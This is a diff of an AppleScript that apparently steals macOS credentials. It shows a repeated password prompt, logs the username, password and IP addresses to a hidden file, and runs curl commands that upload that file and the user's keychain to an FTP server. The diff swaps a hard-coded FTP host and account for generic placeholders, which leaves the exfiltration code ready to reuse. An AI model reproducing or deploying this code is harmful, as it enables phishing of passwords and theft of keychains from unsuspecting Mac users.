@@ -38,9 +38,9 @@ try
 			display dialog "Please try again." with title "Password" buttons {"OK"} default button 1 with icon caution giving up after 3 -- If password is incorrect, try again
 		end try
 	end repeat
-
+	
 	try
-	set dte to (current date) as string
+		set dte to (current date) as string
 		do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d \\< -f 1"
 		set WANIP to (characters 2 through -1 of result) as text -- Get IP
 		set LANIP to (do shell script "ipconfig getifaddr en1")
@@ -51,7 +51,7 @@ try
 	do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt" -- Write information to the text file in the hidden folder
 	
 	try
-		tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u Ben:(pass) ftp://benbern.dyndns.info/Drive/.Passwords/." & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server
+		tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u <User>:<Password> ftp://<ftp address></path/to/folder/>" & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server
 	end try
 	
 	try
@@ -61,8 +61,9 @@ try
 	end try
 	
 	try
-		tell application "Finder" to do shell script "curl -T " & ufld & "" & theuser & ".keychain -u Ben:(pass) ftp://Benbern.dyndns.info/Drive/.Passwords/." & theuser & "_" & WANIP & "_" & dte & ".keychain" -- Upload Keychain to FTP server
+		tell application "Finder" to do shell script "curl -T " & ufld & "" & theuser & ".keychain -u <User>:<Password> ftp://<ftp address></path/to/folder/>" & theuser & "_" & WANIP & "_" & dte & ".keychain" -- Upload Keychain to FTP server
 	end try
+	
 end try
 
 try
